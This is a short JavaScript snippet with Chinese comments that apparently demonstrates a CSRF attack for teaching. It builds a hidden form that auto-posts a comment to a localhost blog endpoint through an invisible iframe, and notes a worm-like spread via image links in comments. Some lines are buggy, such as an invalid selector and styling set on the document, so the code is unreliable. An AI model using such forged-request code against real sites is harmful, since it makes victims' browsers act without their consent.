//post提交得话，攻击得伪造个表单，表单提交没有跨域问题
document.write(`
    <form name="commentForm" target="csrf"
        method="post" action="http://localhost:1521/post/addComment">
        <input name="postId" type="hidden" value="13">
        <textarea name="content">来自CSRF！</textarea>
    </form>
`)
var iframe = document.createElement('iframe');
iframe.name = 'csrf'; //和form的target相同这样表单提交就在iframe里面不会发生页面跳转
document.style.display = 'none';//页面中看不到
document.body.appendChild(iframe);

setTimeout(function () {
    document.querySelector('[name:commentForm]').submit();
}, 1000);

<img src='http://xxx' />
//如果提交的评论还是链接连到这个img的地址，那么用户点击带链接的评论又会中招(蠕虫病毒)